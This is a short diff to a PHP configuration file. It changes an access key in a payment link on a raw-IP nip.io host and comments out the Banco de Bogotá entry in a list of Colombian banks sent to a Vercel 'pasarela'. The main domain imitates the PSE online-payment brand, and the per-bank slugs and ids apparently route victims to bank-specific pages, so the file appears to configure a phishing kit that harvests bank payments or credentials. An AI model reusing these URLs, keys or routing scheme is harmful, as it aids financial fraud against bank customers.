@@ -18,13 +18,13 @@ return [
 
     'links' => [
         'primary_page' => 'https://pago-sonlinepse.vercel.app/',
-        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/pay?key=e1886a0c32f042b5',
+        'recaudofall_base' => 'https://recaudofall.94.250.202.215.nip.io/pay?key=2286c96f3e274b29',
     ],
 
     // Bancos que van a la pasarela Vercel
     // Si comentas una línea, ese banco cae automáticamente a recaudofall.
     'primary_banks' => [
-        'bogota' => ['slug' => 'bg', 'id' => '5342f229df47492baebe7f3e'],
+  //      'bogota' => ['slug' => 'bg', 'id' => '5342f229df47492baebe7f3e'],
  //        'occidente' => ['slug' => 'occ', 'id' => 'b452b98bf3aaa5a90bdcc464'],
   //   'popular' => ['slug' => 'pop', 'id' => 'b452b98bf3aaa5a90bdcc464'],
   //        'avvillas' => ['slug' => 'avv', 'id' => 'b452b98bf3aaa5a90bdcc464'],
